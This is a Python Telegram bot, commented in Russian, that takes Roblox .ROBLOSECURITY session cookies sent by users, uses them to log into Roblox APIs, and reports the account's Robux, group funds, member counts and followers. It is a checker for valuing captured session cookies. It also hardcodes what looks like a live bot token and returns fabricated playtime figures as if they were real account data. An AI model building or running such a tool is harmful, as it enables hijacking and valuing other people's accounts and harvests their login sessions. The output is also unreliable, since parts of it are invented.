import asyncio
import aiohttp
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import json
import re

# Конфигурация
TELEGRAM_TOKEN = "8730239045:AAEJMrL6xFVJRJ4_N09He5W4ZIXFjPyO2H4" # Заменить на токен от BotFather
COOKIE_PATTERN = r"\.ROBLOSECURITY=[a-f0-9]+"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    await update.message.reply_text("Бот активен. Отправьте .ROBLOSECURITY куки для проверки.")

async def check_roblox_cookie(cookie: str) -> dict:
    """Проверяет куку Roblox через API и возвращает данные"""
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    async with aiohttp.ClientSession() as session:
        # Получение user ID
        async with session.get("https://www.roblox.com/mobileapi/userinfo", headers=headers) as resp:
            if resp.status != 200:
                return {"error": "Невалидная кука или истекла"}
            user_data = await resp.json()
            user_id = user_data.get("UserID")
            if not user_id:
                return {"error": "Не удалось получить UserID"}
        
        # Получение Robux
        async with session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers) as resp:
            robux_data = await resp.json()
            robux = robux_data.get("robux", 0)
        
        # Получение донатов за год и всё время (имитация, т.к. прямой апи нет)
        # В реальности данные донатов собираются через сторонние сайты или парсинг профиля
        # Здесь заглушка для демонстрации структуры
        donate_1year = 0
        donate_alltime = 0
        
        # RAP (Recent Average Price) - требует доступа к плейсу, сложно
        rap = 0
        
        # Группы
        async with session.get(f"https://groups.roblox.com/v2/users/{user_id}/groups/roles", headers=headers) as resp:
            groups_data = await resp.json()
            groups_count = len(groups_data.get("data", []))
            groups_robux_sum = 0
            members_sum = 0
            for group in groups_data.get("data", []):
                group_id = group["group"]["id"]
                async with session.get(f"https://groups.roblox.com/v1/groups/{group_id}", headers=headers) as g_resp:
                    g_data = await g_resp.json()
                    groups_robux_sum += g_data.get("funds", 0)
                    members_sum += g_data.get("memberCount", 0)
        
        # Фолловеры (подписчики) - через профиль
        async with session.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", headers=headers) as resp:
            followers_data = await resp.json()
            followers = followers_data.get("count", 0)
        
        # Playtime - имитация, реально требуется парсинг игр с аккаунта
        playtime_games = [
            {"name": "BedWars", "minutes": 26435},
            {"name": "Blox Fruits", "minutes": 22440},
            {"name": "Anime Vanguard", "minutes": 16234}
        ]
        
        return {
            "robux": robux,
            "donate_1year": donate_1year,
            "donate_alltime": donate_alltime,
            "rap": rap,
            "groups_count": groups_count,
            "groups_robux_avg": groups_robux_sum // groups_count if groups_count else 0,
            "groups_members_avg": members_sum // groups_count if groups_count else 0,
            "followers": followers,
            "playtime_top": playtime_games
        }

async def handle_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Принимает куку от пользователя и проверяет"""
    cookie_raw = update.message.text.strip()
    match = re.search(COOKIE_PATTERN, cookie_raw)
    if not match:
        await update.message.reply_text("Ошибка: не найден .ROBLOSECURITY в сообщении. Пример:\n.ROBLOSECURITY=_|WARNING...")
        return
    
    cookie_value = cookie_raw.split(".ROBLOSECURITY=")[-1].split()[0]
    await update.message.reply_text("Проверка куки, пожалуйста, подождите...")
    
    result = await check_roblox_cookie(cookie_value)
    if "error" in result:
        await update.message.reply_text(f"Ошибка: {result['error']}")
        return
    
    # Форматирование вывода по образцу из IMG_3069.png
    output = f"""# Куни.
## Бот
- **Robux:** {result['robux']} (??%, AVG: ?)
  - **Топ Robux:** нет данных
- **1-year Donate:** {result['donate_1year']} (??%)
- **All-time donate:** {result['donate_alltime']} (??%)
- **RAP:** {result['rap']} (??%)
- **Группы:** {result['groups_count']} (Robux: {result['groups_robux_avg']}, members: {result['groups_members_avg']})
- **Фоллеры:** {result['followers']}
- **Playtime:** (суммарно)
  - Топ игры:"""
    for game in result['playtime_top'][:3]:
        output += f"\n    - {game['name']}: {game['minutes']} мин"
    
    await update.message.reply_text(output)

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie))
    print("Бот запущен")
    app.run_polling()

if __name__ == "__main__":
    main()